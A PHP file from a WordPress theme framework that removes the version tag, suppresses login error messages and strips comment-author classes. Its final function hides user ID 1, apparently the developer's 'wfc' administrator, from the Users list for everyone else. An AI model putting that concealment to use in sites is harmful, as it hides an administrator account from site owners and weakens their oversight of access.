<?php
    /**
     *
     * @package scf-framework
     * @author Steve (6/11/2012)
     * @version 2.2
     */
    /**
     * This file houses all our security functions.
     */
    /*
    ===============================
    FRAMEWORK SECURITY SETUP
    ===============================
    */
    add_action( 'after_setup_theme', 'wfc_framework_security_setup' );
    if( !function_exists( 'wfc_framework_security_setup' ) ):
        function wfc_framework_security_setup(){
            /*
            ===============================
            REMOVE WORDPRESS VERSION
            ===============================
            */
            remove_action( 'wp_head', 'wp_generator' );
            /*
            ===============================
            HIDE LOGIN ERROR MESSAGES (WRONG PASSWORD, NO SUCH USER ETC.)
            ===============================
            */
            add_filter( 'login_errors', create_function( '$a', "return null;" ) );
        }
    endif; // wfc_framework_security_setup
    /*
    ===============================
    REMOVE ADMIN NAME IN COMMENTS CLASS
    ===============================
    */
    add_filter( 'comment_class', 'wfc_remove_comment_author_class' );
    function wfc_remove_comment_author_class( $classes ){
        foreach( $classes as $key => $class ){
            if( strstr( $class, "comment-author-" ) ){
                unset($classes[$key]);
            }
        }
        return $classes;
    }

    /*
    ===============================
    REMOVE 'WFC' USER FROM USERS TABLE
    ===============================
    */
    add_action( 'pre_user_query', 'wfc_remove_our_user' );
    function wfc_remove_our_user( $user_search ){
        global $current_user;
        global $wpdb;
        if( $current_user->user_login != 'wfc' ){
            $user_search->query_where = str_replace(
                'WHERE 1=1',
                "WHERE 1=1 AND {$wpdb->users}.ID<>1", $user_search->query_where );
        }
    }